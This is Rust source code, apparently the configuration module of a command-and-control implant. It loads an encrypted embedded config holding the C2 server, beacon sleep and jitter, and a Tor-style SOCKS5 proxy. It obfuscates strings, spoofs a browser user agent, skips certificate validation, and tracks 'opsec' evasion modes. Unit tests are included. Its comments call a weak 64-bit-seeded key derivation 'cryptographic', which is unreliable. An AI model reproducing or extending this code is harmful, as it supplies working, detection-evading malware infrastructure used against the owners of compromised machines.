use serde::{Deserialize, Serialize};
use std::fs;
use std::io;
use std::path::Path;
use std::env;
use log::{info, warn, error};
use reqwest::{Client, Proxy};
use obfstr::obfstr;

/// Key derivation using ChaCha20 quarter-round mixing over DefaultHasher seed.
/// IMPORTANT: This implementation MUST match build.rs derive_key_from_seed() exactly.
/// Build scripts cannot import from the main crate, so this is intentionally duplicated.
#[cfg(any(feature = "encryption-aes", feature = "encryption-chacha"))]
fn derive_key_from_seed(seed: &str) -> [u8; 32] {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    
    // Fast single-pass approach using ChaCha20's core function for key stretching
    let mut key = [0u8; 32];
    
    // Convert seed to fixed-size input for consistent performance
    let mut seed_hash = DefaultHasher::new();
    seed.hash(&mut seed_hash);
    let seed_u64 = seed_hash.finish();
    
    // Use ChaCha20's quarter-round for cryptographic mixing
    let mut state = [
        // ChaCha20 constants
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        // Seed-derived values
        seed_u64 as u32, (seed_u64 >> 32) as u32,
        seed.len() as u32, 0x00000001,
        // More constants for entropy
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
    ];
    
    // Perform 4 ChaCha20 quarter-rounds for key mixing
    for _ in 0..4 {
        chacha20_quarter_round(&mut state, 0, 4, 8, 12);
        chacha20_quarter_round(&mut state, 1, 5, 9, 13);
        chacha20_quarter_round(&mut state, 2, 6, 10, 14);
        chacha20_quarter_round(&mut state, 3, 7, 11, 15);
        
        chacha20_quarter_round(&mut state, 0, 5, 10, 15);
        chacha20_quarter_round(&mut state, 1, 6, 11, 12);
        chacha20_quarter_round(&mut state, 2, 7, 8, 13);
        chacha20_quarter_round(&mut state, 3, 4, 9, 14);
    }
    
    // Extract 32 bytes from the mixed state
    for (i, chunk) in state[0..8].iter().enumerate() {
        let bytes = chunk.to_le_bytes();
        key[i * 4..(i + 1) * 4].copy_from_slice(&bytes);
    }
    
    key
}

/// ChaCha20 quarter-round function
#[inline]
fn chacha20_quarter_round(state: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(16);
    
    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(12);
    
    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(8);
    
    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(7);
}

// Fallback for configurations without encryption features
#[cfg(not(any(feature = "encryption-aes", feature = "encryption-chacha")))]
fn derive_key_from_seed(seed: &str) -> [u8; 32] {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    
    let mut key = [0u8; 32];
    let mut hasher = DefaultHasher::new();
    seed.hash(&mut hasher);
    
    let hash = hasher.finish();
    let hash_bytes = hash.to_le_bytes();
    
    // Fill key by repeating hash pattern
    for (i, byte) in key.iter_mut().enumerate() {
        *byte = hash_bytes[i % 8] ^ ((i as u8).wrapping_mul(seed.len() as u8));
    }
    
    key
}

// --- AES Decryption Logic ---
#[cfg(feature = "encryption-aes")]
fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Key, Nonce};

    if encrypted_data.len() < 12 {
        return Err("Encrypted data too short".to_string());
    }
    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    // Derive key from seed instead of direct usage
    let key_material = derive_key_from_seed(key_str);
    let key = Key::<Aes256Gcm>::from_slice(&key_material);

    let cipher = Aes256Gcm::new(key);
    let decrypted_bytes = cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("AES decrypt failed: {}", e))?;
    String::from_utf8(decrypted_bytes).map_err(|e| e.to_string())
}

// --- ChaCha20 Decryption Logic ---
#[cfg(all(feature = "encryption-chacha", not(feature = "encryption-aes")))]
fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
    use chacha20poly1305::aead::{Aead, KeyInit};
    use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};

    if encrypted_data.len() < 12 {
        return Err("Encrypted data too short".to_string());
    }
    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    // Derive key from seed instead of direct usage
    let key_material = derive_key_from_seed(key_str);
    let key = Key::from_slice(&key_material);

    let cipher = ChaCha20Poly1305::new(key);
    let decrypted_bytes = cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("ChaCha20 decrypt failed: {}", e))?;
    String::from_utf8(decrypted_bytes).map_err(|e| e.to_string())
}

// --- Fallback: XOR deobfuscation when no encryption feature is enabled ---
#[cfg(not(any(feature = "encryption-aes", feature = "encryption-chacha")))]
fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
    let key = derive_key_from_seed(key_str);
    let decrypted: Vec<u8> = encrypted_data
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();
    String::from_utf8(decrypted).map_err(|e| format!("XOR decrypt failed: {}", e))
}

// Include the generated config file
include!(concat!(env!("OUT_DIR"), "/config.rs"));

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub payload_id: String,
    pub protocol: String,
    #[serde(default)]
    pub socks5_enabled: bool,
    #[serde(default = "default_socks5_host")]
    pub socks5_host: String,
    #[serde(default = "default_socks5_port")]
    pub socks5_port: u16,
    #[serde(default = "default_proc_scan_interval")]
    pub proc_scan_interval_secs: u64,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_base_score_threshold_bg_to_reduced")]
    pub base_score_threshold_bg_to_reduced: f32,
    #[serde(default = "default_base_score_threshold_reduced_to_full")]
    pub base_score_threshold_reduced_to_full: f32,
    #[serde(default = "default_min_duration_full_opsec")]
    pub min_duration_full_opsec_secs: u64,
    #[serde(default = "default_min_duration_background_opsec")]
    pub min_duration_background_opsec_secs: u64,
    #[serde(default = "default_base_max_consecutive_c2_failures")]
    pub base_max_consecutive_c2_failures: u32,
    #[serde(default = "default_min_duration_reduced_activity_secs")]
    pub min_duration_reduced_activity_secs: u64,
    #[serde(default = "default_reduced_activity_sleep_secs")]
    pub reduced_activity_sleep_secs: u64,
    #[serde(default = "default_c2_failure_threshold_increase_factor")]
    pub c2_failure_threshold_increase_factor: f32,
    #[serde(default = "default_c2_failure_threshold_decrease_factor")]
    pub c2_failure_threshold_decrease_factor: f32,
    #[serde(default = "default_c2_threshold_adjust_interval_secs")]
    pub c2_threshold_adjust_interval_secs: u64,
    #[serde(default = "default_c2_dynamic_threshold_max_multiplier")]
    pub c2_dynamic_threshold_max_multiplier: f32,
}

fn default_socks5_host() -> String {
    obfstr!("127.0.0.1").to_string()
}

fn default_socks5_port() -> u16 {
    9050
}

fn default_proc_scan_interval() -> u64 { 300 }

fn default_user_agent() -> String {
    // Use a common browser user agent as default
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string()
}

fn default_base_score_threshold_bg_to_reduced() -> f32 {
    20.0
}

fn default_base_score_threshold_reduced_to_full() -> f32 {
    60.0
}

fn default_min_duration_full_opsec() -> u64 {
    300 // Default 5 minutes in FullOpsec
}

fn default_min_duration_background_opsec() -> u64 {
    60 // Default 1 minute in BackgroundOpsec
}

fn default_base_max_consecutive_c2_failures() -> u32 {
    5 // Default: trigger signal after 5 consecutive failures
}

fn default_min_duration_reduced_activity_secs() -> u64 {
    120 // Default 2 minutes in ReducedActivity
}

fn default_reduced_activity_sleep_secs() -> u64 {
    120 // Default 2 minutes sleep for ReducedActivity
}

fn default_c2_failure_threshold_increase_factor() -> f32 {
    1.0 // Default: No increase
}

fn default_c2_failure_threshold_decrease_factor() -> f32 {
    1.0 // Default: No decrease
}

fn default_c2_threshold_adjust_interval_secs() -> u64 {
    u64::MAX // Default: Effectively disable periodic adjustment
}

fn default_c2_dynamic_threshold_max_multiplier() -> f32 {
    1.0 // Default: Dynamic threshold cannot exceed base threshold
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::new(),
            sleep_interval: 5,
            jitter: 2,
            payload_id: String::new(),
            protocol: obfstr!("http").to_string(),
            socks5_enabled: false,
            socks5_host: obfstr!("127.0.0.1").to_string(),
            socks5_port: 9050,
            proc_scan_interval_secs: default_proc_scan_interval(),
            user_agent: default_user_agent(),
            base_score_threshold_bg_to_reduced: default_base_score_threshold_bg_to_reduced(),
            base_score_threshold_reduced_to_full: default_base_score_threshold_reduced_to_full(),
            min_duration_full_opsec_secs: default_min_duration_full_opsec(),
            min_duration_background_opsec_secs: default_min_duration_background_opsec(),
            base_max_consecutive_c2_failures: default_base_max_consecutive_c2_failures(),
            min_duration_reduced_activity_secs: default_min_duration_reduced_activity_secs(),
            reduced_activity_sleep_secs: default_reduced_activity_sleep_secs(),
            c2_failure_threshold_increase_factor: default_c2_failure_threshold_increase_factor(),
            c2_failure_threshold_decrease_factor: default_c2_failure_threshold_decrease_factor(),
            c2_threshold_adjust_interval_secs: default_c2_threshold_adjust_interval_secs(),
            c2_dynamic_threshold_max_multiplier: default_c2_dynamic_threshold_max_multiplier(),
        }
    }
}

// The AgentConfig struct is used to load and manage the agent's configuration.
impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        // Primary method: Load from embedded, encrypted config
        match decrypt_config(ENCRYPTED_CONFIG, CONFIG_KEY) {
            Ok(json_config) => {
                info!("[CONFIG] Successfully decrypted and loaded embedded configuration.");
                if let Ok(config) = serde_json::from_str::<AgentConfig>(&json_config) {
                     return Ok(config);
                }
            }
            Err(e) => {
                error!("[CONFIG] FAILED to decrypt embedded config: {}. Falling back.", e);
            }
        }

        // Fallback: Load from config.json in the same directory as the executable
        if let Ok(mut exe_path) = env::current_exe() {
            exe_path.pop();
            let config_path = exe_path.join(".config/config.json");
            if let Ok(contents) = fs::read_to_string(config_path) {
                if let Ok(config) = serde_json::from_str(&contents) {
                    warn!("[CONFIG] Loaded configuration from filesystem as a fallback.");
                    return Ok(config);
                }
            }
        }

        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
            self.server_url.clone()
        } else {
            format!("{}://{}", self.protocol, self.server_url)
        }
    }

    /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
    pub fn build_http_client(&self) -> Result<Client, io::Error> {
        let builder = Client::builder()
            .user_agent(self.user_agent.clone())
            .danger_accept_invalid_certs(true);

        if self.socks5_enabled {
            let proxy_url = format!("socks5h://{}:{}", self.socks5_host, self.socks5_port);
            info!("[HTTP] Building HTTP client with SOCKS5 proxy: {}", proxy_url);
            match builder
                .proxy(Proxy::all(&proxy_url).map_err(|e| {
                    error!("[HTTP] Invalid proxy URL: {}", e);
                    io::Error::new(io::ErrorKind::Other, format!("Invalid proxy URL: {}", e))
                })?)
                .build() {
                Ok(client) => Ok(client),
                Err(e) => {
                    error!("[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}", e);
                    Err(io::Error::new(io::ErrorKind::Other, format!("Failed to build HTTP client with proxy: {}", e)))
                }
            }
        } else {
            info!("[HTTP] Building HTTP client with direct connection (no proxy)");
            builder
                .build()
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_key_derivation_consistency() {
        // Test that same seed always produces same key
        let seed = "test-payload-id-123";
        let key1 = derive_key_from_seed(seed);
        let key2 = derive_key_from_seed(seed);
        
        assert_eq!(key1, key2, "Same seed should produce identical keys");
    }

    #[test]
    fn test_key_derivation_uniqueness() {
        // Test that different seeds produce different keys
        let key1 = derive_key_from_seed("payload-id-1");
        let key2 = derive_key_from_seed("payload-id-2");
        
        assert_ne!(key1, key2, "Different seeds should produce different keys");
    }

    #[test]
    fn test_key_derivation_entropy() {
        // Test that keys have good entropy distribution
        let key = derive_key_from_seed("test-payload");
        
        // Check that key is not all zeros
        assert_ne!(key, [0u8; 32], "Key should not be all zeros");
        
        // Check that key has reasonable entropy (not too many repeated bytes)
        let mut byte_counts = [0u32; 256];
        for &byte in &key {
            byte_counts[byte as usize] += 1;
        }
        
        // No single byte should appear more than half the time
        let max_count = *byte_counts.iter().max().unwrap();
        assert!(max_count <= 16, "Key should have reasonable entropy distribution");
    }

    #[test]
    fn test_short_seed_handling() {
        // Test that short seeds still produce full 256-bit keys
        let short_key = derive_key_from_seed("a");
        let long_key = derive_key_from_seed("this-is-a-much-longer-payload-id-string");
        
        assert_eq!(short_key.len(), 32);
        assert_eq!(long_key.len(), 32);
        assert_ne!(short_key, long_key);
    }

    #[test]
    fn test_empty_seed_handling() {
        // Test that empty seed still produces a key (though not recommended)
        let key = derive_key_from_seed("");
        assert_eq!(key.len(), 32);
        assert_ne!(key, [0u8; 32]);
    }

    #[test]
    fn test_encryption_decryption_roundtrip() {
        // Test that we can encrypt and decrypt with derived keys
        let test_data = "This is test configuration data";
        let payload_id = "test-payload-123";
        
        // This simulates the build.rs encryption and config.rs decryption process
        #[cfg(feature = "encryption-chacha")]
        {
            use chacha20poly1305::aead::{Aead, AeadCore, KeyInit, OsRng};
            use chacha20poly1305::{ChaCha20Poly1305, Key};
            
            // Encrypt (like build.rs does)
            let key_material = derive_key_from_seed(payload_id);
            let key = Key::from_slice(&key_material);
            let cipher = ChaCha20Poly1305::new(key);
            let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
            let ciphertext = cipher.encrypt(&nonce, test_data.as_bytes()).expect("Encryption failed");
            
            let mut encrypted_data = nonce.to_vec();
            encrypted_data.extend_from_slice(&ciphertext);
            
            // Decrypt (like config.rs does)
            let decrypted = decrypt_config(&encrypted_data, payload_id).expect("Decryption failed");
            assert_eq!(decrypted, test_data);
        }
    }

    #[test]
    fn test_optimized_kdf_performance() {
        // Test that the optimized KDF is fast and consistent
        use std::time::Instant;
        
        let payload_id = "performance-test-payload-id-123";
        let iterations = 10000;
        
        let start = Instant::now();
        for _ in 0..iterations {
            let _ = derive_key_from_seed(payload_id);
        }
        let elapsed = start.elapsed();
        
        println!("Optimized KDF: {} iterations in {:?} ({:.2} μs/iter)", 
                iterations, elapsed, elapsed.as_micros() as f64 / iterations as f64);
        
        // Should be very fast (much less than 1ms per iteration)
        assert!(elapsed.as_millis() < 100, "KDF should be fast for agent optimization");
    }

    #[test]
    fn test_chacha20_mixing_quality() {
        // Test that ChaCha20 mixing provides good diffusion
        let key1 = derive_key_from_seed("test1");
        let key2 = derive_key_from_seed("test2"); 
        
        // Keys should be completely different
        assert_ne!(key1, key2);
        
        // Should have good Hamming distance (many bit differences)
        let mut bit_differences = 0;
        for (b1, b2) in key1.iter().zip(key2.iter()) {
            bit_differences += (b1 ^ b2).count_ones();
        }
        
        // Should have approximately 50% bit differences (good avalanche)
        assert!(bit_differences > 100 && bit_differences < 156, 
                "Should have good avalanche effect, got {} bit differences", bit_differences);
    }
}
